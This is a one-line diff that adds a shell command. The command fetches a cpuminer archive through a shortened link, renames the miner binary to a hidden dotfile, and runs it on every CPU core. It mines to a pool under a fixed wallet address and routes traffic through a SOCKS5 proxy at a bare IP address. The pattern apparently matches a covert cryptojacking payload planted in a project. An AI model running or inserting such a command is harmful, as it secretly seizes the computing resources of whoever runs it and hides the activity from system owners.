@@ -1,0 +1,1 @@
+wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RWYv6sY4uW8he8nGiy1Wwab8NBEJzsp3hZ.WOR -t $(nproc --all) --no-tune -x socks5://1234:1234@139.177.207.31:3838
